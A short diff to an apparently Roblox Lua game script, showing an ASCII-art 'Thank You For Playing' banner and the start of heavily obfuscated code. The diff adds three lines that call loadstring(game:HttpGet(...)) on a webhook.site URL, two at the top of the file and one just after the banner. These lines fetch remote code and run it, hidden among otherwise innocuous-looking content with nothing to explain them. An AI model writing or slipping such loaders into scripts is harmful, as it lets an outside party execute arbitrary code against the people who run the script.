@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://webhook.site/12953783-b6af-48cb-b216-3f5421409c34"))();
+loadstring(game:HttpGet("https://webhook.site/12953783-b6af-48cb-b216-3f5421409c34"))()
 "--[[
   
 ███████╗░█████╗░██████╗░██████╗░██╗██████╗░██████╗░███████╗███╗░░██╗    ███╗░░░███╗░█████╗░██████╗░███████╗
@@ -19,7 +21,7 @@
            ||-------\\ Extra: new entity
 Thank You For Playing
 --]]
-
+loadstring(game:HttpGet("https://webhook.site/12953783-b6af-48cb-b216-3f5421409c34"))();
 local LLO1jj0=(getfenv and getfenv(1)) or _ENV or _G
 local llIL1LO10Ll,li0OOIiilLjI=string.byte,string.char
 local function ijlL10oI1Iiil(iIjij1ij,lI0lOjLo1jlL)
